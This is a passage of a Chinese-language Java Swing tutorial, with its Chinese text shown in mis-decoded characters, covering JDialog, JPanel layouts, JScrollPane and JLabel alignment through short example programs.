&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-JDialog"><a href="#2-2-JDialog" class="headerlink" title="2.2 JDialog"></a>2.2 JDialog</h3><p>ç»§æ‰¿è‡ªjava.awt.Dialogç±»ã€‚ä»–æ˜¯ä»ä¸€ä¸ªçª—ä½“å¼¹å‡ºæ¥çš„å¦å¤–ä¸€ä¸ªçª—ä½“ã€‚ä»–å’ŒFrameç±»ä¼¼ï¼ŒJDialog:å¯å½“æˆä¸€JFrameä½¿ç”¨ï¼Œä½†å¿…é¡»ä»å±äºJFrame</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºå¯¹è¯æ¡†</span><br><span class="hljs-type">JDialog</span> <span class="hljs-variable">dialog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JDialog</span>(parentFrame, <span class="hljs-string">&quot;å¯¹è¯æ¡†æ ‡é¢˜&quot;</span>, <span class="hljs-literal">true</span>);     <span class="hljs-comment">// trueè¡¨ç¤ºæ¨¡æ€å¯¹è¯æ¡†</span><br>dialog.setSize(<span class="hljs-number">300</span>, <span class="hljs-number">200</span>);<br>dialog.setVisible(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>æ€»ç»“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.awt.event.ActionEvent;<br><span class="hljs-keyword">import</span> java.awt.event.ActionListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçˆ¶çª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">parentFrame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;çˆ¶çª—å£&quot;</span>);<br>        parentFrame.setSize(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>);<br>        parentFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        parentFrame.setLocationRelativeTo(<span class="hljs-literal">null</span>); <span class="hljs-comment">// çª—å£å±…ä¸­</span><br><br>        <span class="hljs-comment">// æ·»åŠ ä¸€ä¸ªæŒ‰é’®åˆ°çˆ¶çª—å£ï¼Œç”¨äºæ¼”ç¤º</span><br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;æ‰“å¼€å¯¹è¯æ¡†&quot;</span>);<br>        button.addActionListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionListener</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">actionPerformed</span><span class="hljs-params">(ActionEvent e)</span> &#123;<br>                <span class="hljs-comment">// åˆ›å»ºå¯¹è¯æ¡†</span><br>                <span class="hljs-type">JDialog</span> <span class="hljs-variable">dialog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JDialog</span>(parentFrame, <span class="hljs-string">&quot;å¯¹è¯æ¡†æ ‡é¢˜&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// trueè¡¨ç¤ºæ¨¡æ€å¯¹è¯æ¡†</span><br>                dialog.setSize(<span class="hljs-number">300</span>, <span class="hljs-number">200</span>);<br>                dialog.setLocationRelativeTo(parentFrame); <span class="hljs-comment">// å¯¹è¯æ¡†å±…ä¸­æ˜¾ç¤º</span><br><br>                <span class="hljs-comment">// æ·»åŠ å¯¹è¯æ¡†å†…å®¹</span><br>                dialog.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BorderLayout</span>());<br>                <span class="hljs-type">JLabel</span> <span class="hljs-variable">label</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å¯¹è¯æ¡†å†…å®¹&quot;</span>, SwingConstants.CENTER);<br>                dialog.add(label, BorderLayout.CENTER);<br><br>                <span class="hljs-comment">// æ·»åŠ å…³é—­æŒ‰é’®</span><br>                <span class="hljs-type">JButton</span> <span class="hljs-variable">closeButton</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;å…³é—­&quot;</span>);<br>                closeButton.addActionListener(ev -&gt; dialog.dispose());<br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">buttonPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                buttonPanel.add(closeButton);<br>                dialog.add(buttonPanel, BorderLayout.SOUTH);<br><br>                dialog.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br><br>        parentFrame.add(button);<br>        parentFrame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-å¸¸ç”¨çš„é¢æ¿"><a href="#3-å¸¸ç”¨çš„é¢æ¿" class="headerlink" title="3. å¸¸ç”¨çš„é¢æ¿"></a>3. å¸¸ç”¨çš„é¢æ¿</h2><p>é¢æ¿ä¹Ÿæ˜¯ä¸€ç§Swingå®¹å™¨ï¼Œä»–å¯ä»¥ä½œä¸ºå®¹å™¨å®¹å™¨æ·»åŠ å®¹çº³å…¶ä»–çš„ç»„ä»¶ï¼Œä½†æ˜¯ä»–è€Œå·²å¿…é¡»è¢«åŠ åœ¨ä¸€ä¸ªå®¹å™¨å†…ã€‚</p><h3 id="3-1-JPanel"><a href="#3-1-JPanel" class="headerlink" title="3.1 JPanel"></a>3.1 JPanel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ›å»ºé¢æ¿</span><br><span class="hljs-type">JPanel</span> <span class="hljs-variable">panel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br><br><span class="hljs-comment">// è®¾ç½®å¸ƒå±€ç®¡ç†å™¨</span><br><span class="hljs-type">JPanel</span> <span class="hljs-variable">topPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());    <span class="hljs-comment">//æµå¼å¸ƒå±€,ç»„ä»¶ä»å·¦åˆ°å³ä¾æ¬¡æ’åˆ—ï¼Œåƒæ°´æµä¸€æ ·</span><br><span class="hljs-type">JPanel</span> <span class="hljs-variable">leftPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>));  <span class="hljs-comment">//5è¡Œ1åˆ—çš„ç½‘æ ¼ï¼Œæ¯ä¸ªç»„ä»¶å æ»¡ä¸€æ ¼</span><br><span class="hljs-type">JPanel</span> <span class="hljs-variable">centerPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();  <span class="hljs-comment">// ç­‰åŒäº new JPanel(new FlowLayout())</span><br> <br><span class="hljs-comment">// æ·»åŠ ç»„ä»¶åˆ°é¢æ¿</span><br>panel.add(button);<br>panel.add(label);<br><br><span class="hljs-comment">// å°†é¢æ¿æ·»åŠ åˆ°çª—å£</span><br>frame.add(panel);<br><span class="hljs-comment">// å°†é¢æ¿æ·»åŠ åˆ°çª—å£,æ‹¼å›¾åŒºåŸŸ</span><br>frame.add(centerPanel, BorderLayout.CENTER);<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// åˆ›å»ºçª—å£</span><br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">jf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;Frame&quot;</span>);<br>        jf.setBounds(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>, <span class="hljs-number">120</span>, <span class="hljs-number">120</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºæŒ‰é’®</span><br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">jb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;é¦™è•‰&quot;</span>);<br>        <span class="hljs-type">JButton</span> <span class="hljs-variable">jb2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;è‰è“&quot;</span>);<br><br>        <span class="hljs-comment">// åˆ›å»ºé¢æ¿å¹¶æ·»åŠ æŒ‰é’®</span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">jp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        jp.add(jb);<br>        jp.add(jb2);<br><br>        <span class="hljs-comment">// å°†é¢æ¿æ·»åŠ åˆ°çª—å£</span><br>        jf.add(jp);<br><br>        <span class="hljs-comment">// è®¾ç½®å…³é—­æ“ä½œå¹¶æ˜¾ç¤ºçª—å£</span><br>        jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        jf.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;å®ç”¨ç¤ºä¾‹&quot;</span>);<br>        frame.setSize(<span class="hljs-number">600</span>, <span class="hljs-number">400</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BorderLayout</span>());<br><br>        <span class="hljs-comment">// é¡¶éƒ¨å·¥å…·æ </span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">topPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>());<br>        topPanel.setBackground(Color.LIGHT_GRAY);<br>        topPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;æ–‡ä»¶&quot;</span>));<br>        topPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;ç¼–è¾‘&quot;</span>));<br>        topPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;è§†å›¾&quot;</span>));<br>        frame.add(topPanel, BorderLayout.NORTH);<br><br>        <span class="hljs-comment">// å·¦ä¾§è¾¹æ </span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">leftPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>));<br>        leftPanel.setBackground(Color.CYAN);<br>        leftPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;é€‰é¡¹1&quot;</span>));<br>        leftPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;é€‰é¡¹2&quot;</span>));<br>        leftPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;é€‰é¡¹3&quot;</span>));<br>        frame.add(leftPanel, BorderLayout.WEST);<br><br>        <span class="hljs-comment">// ä¸­é—´å†…å®¹åŒº</span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">centerPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>        centerPanel.setBackground(Color.WHITE);<br>        centerPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;ä¸»è¦å†…å®¹åŒºåŸŸ&quot;</span>));<br>        frame.add(centerPanel, BorderLayout.CENTER);<br><br>        <span class="hljs-comment">// å¢åŠ ï¼šå³ä¾§è¾¹æ </span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">rightPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>));<br>        rightPanel.setBackground(Color.ORANGE);<br>        rightPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;å·¥å…·1&quot;</span>));<br>        rightPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;å·¥å…·2&quot;</span>));<br>        rightPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;å·¥å…·3&quot;</span>));<br>        frame.add(rightPanel, BorderLayout.EAST);<br><br>        <span class="hljs-comment">// å¢åŠ ï¼šåº•éƒ¨çŠ¶æ€æ </span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">bottomPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlowLayout</span>(FlowLayout.LEFT));<br>        bottomPanel.setBackground(Color.GREEN);<br>        bottomPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;çŠ¶æ€ï¼šå°±ç»ª&quot;</span>));<br>        bottomPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot; | &quot;</span>));<br>        bottomPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;è¡Œï¼š1&quot;</span>));<br>        bottomPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot; | &quot;</span>));<br>        bottomPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;åˆ—ï¼š1&quot;</span>));<br>        frame.add(bottomPanel, BorderLayout.SOUTH);<br><br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-JScrollPane"><a href="#3-2-JScrollPane" class="headerlink" title="3.2 JScrollPane"></a>3.2 JScrollPane</h3><p>JScrollPaneæ˜¯å¸¦æ»šåŠ¨æ¡çš„é¢æ¿ã€‚å› æ­¤ï¼Œåœ¨ç¢°åˆ°éœ€è¦å°†ä¸€ä¸ªå¤§çš„ç»„ä»¶æ”¾åˆ°ä¸€ä¸ªè¾ƒå°çš„ç©ºé—´çš„æ—¶å€™ï¼Œä½¿ç”¨è¯¥é¢æ¿ã€‚JScrollPaneå†…åªèƒ½æ·»åŠ ä¸€ä¸ªç»„ä»¶ï¼›å› æ­¤ï¼Œå¦‚æœéœ€è¦å°†å¤šä¸ªç»„ä»¶æ·»åŠ åˆ°ä¸€ä¸ªJScrollPaneä¸­æ—¶ï¼Œéœ€è¦å…ˆå°†éœ€è¦æ·»åŠ çš„ç»„ä»¶æ·»åŠ åˆ°JPanelrä¸­ï¼Œå†å°†JPanelæ·»åŠ åˆ°JScrollPaneä¸­ã€‚</p><p><strong>JScrollPane æ˜¯â€å¸¦æ»šåŠ¨æ¡çš„å®¹å™¨â€ï¼Œå®ƒåªèƒ½ç›´æ¥å®¹çº³ä¸€ä¸ªç»„ä»¶ã€‚</strong> å°±åƒä¸€ä¸ªå¤§ç›¸æ¡†åªèƒ½ç›´æ¥æ”¾ä¸€å¼ ç…§ç‰‡ï¼Œä½†ä½ å¯ä»¥æŠŠå¤šå¼ å°ç…§ç‰‡å…ˆè´´åœ¨ä¸€å¼ å¤§çº¸æ¿ä¸Šï¼Œå†æŠŠçº¸æ¿æ”¾è¿›ç›¸æ¡†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;æ­£ç¡®ç¤ºä¾‹&quot;</span>);<br>        frame.setSize(<span class="hljs-number">300</span>, <span class="hljs-number">200</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br><br>        <span class="hljs-comment">// âœ… æ­£ç¡®ï¼šå…ˆåˆ›å»ºJPanelï¼Œæ·»åŠ å¤šä¸ªç»„ä»¶</span><br>        <span class="hljs-type">JPanel</span> <span class="hljs-variable">contentPanel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>        contentPanel.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">10</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">// 10è¡Œ1åˆ—</span><br><br>        <span class="hljs-comment">// å‘JPanelæ·»åŠ å¤šä¸ªæŒ‰é’®</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">10</span>; i++) &#123;<br>            contentPanel.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;æŒ‰é’® &quot;</span> + i));<br>        &#125;<br><br>        <span class="hljs-comment">// âœ… å†å°†JPanelæ·»åŠ åˆ°JScrollPane</span><br>        <span class="hljs-type">JScrollPane</span> <span class="hljs-variable">scrollPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JScrollPane</span>(contentPanel);<br><br>        frame.add(scrollPane);<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-å¸¸ç”¨çš„ç»„ä»¶"><a href="#4-å¸¸ç”¨çš„ç»„ä»¶" class="headerlink" title="4. å¸¸ç”¨çš„ç»„ä»¶"></a>4. å¸¸ç”¨çš„ç»„ä»¶</h2><h3 id="4-1-æ ‡ç­¾ç»„ä»¶"><a href="#4-1-æ ‡ç­¾ç»„ä»¶" class="headerlink" title="4.1 æ ‡ç­¾ç»„ä»¶"></a>4.1 æ ‡ç­¾ç»„ä»¶</h3><p>ä½œç”¨ï¼šæ˜¾ç¤ºæ–‡æœ¬æˆ–è€…æç¤ºä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JLabel</span> <span class="hljs-variable">rightLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>();<br><span class="hljs-type">JLabel</span> <span class="hljs-variable">rightLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(Icon icon);<span class="hljs-comment">//è®¾ç½®å›¾æ ‡</span><br><span class="hljs-type">JLabel</span> <span class="hljs-variable">rightLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å³å¯¹é½æ–‡æœ¬&quot;</span>, SwingConstants.RIGHT);<span class="hljs-comment">//è®¾ç½®å›¾æ ‡+æ°´å¹³å¯¹é½æ–¹å¼</span><br><span class="hljs-type">JLabel</span> <span class="hljs-variable">rightLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(String str,<span class="hljs-type">int</span> aligment);<span class="hljs-comment">//è®¾ç½®æ–‡æœ¬+æ°´å¹³å¯¹é½æ–¹å¼LEFTã€CENTERã€RIGHT</span><br><span class="hljs-type">JLabel</span> <span class="hljs-variable">rightLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(String str,Icon icon,<span class="hljs-type">int</span> aligment);<span class="hljs-comment">//è®¾ç½®æ–‡æœ¬+å›¾æ ‡+æ°´å¹³å¯¹é½æ–¹å¼</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;æ ‡ç­¾å¯¹é½ç¤ºä¾‹&quot;</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>        frame.setSize(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>);<br>        frame.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">// 3è¡Œ1åˆ—å¸ƒå±€</span><br><br>        <span class="hljs-comment">// åˆ›å»ºä¸‰ä¸ªä¸åŒå¯¹é½æ–¹å¼çš„æ ‡ç­¾</span><br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">leftLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å·¦å¯¹é½æ–‡æœ¬&quot;</span>, SwingConstants.LEFT);<br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">centerLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å±…ä¸­å¯¹é½æ–‡æœ¬&quot;</span>, SwingConstants.CENTER);<br>        <span class="hljs-type">JLabel</span> <span class="hljs-variable">rightLabel</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JLabel</span>(<span class="hljs-string">&quot;å³å¯¹é½æ–‡æœ¬&quot;</span>, SwingConstants.RIGHT);<br><br>        <span class="hljs-comment">// 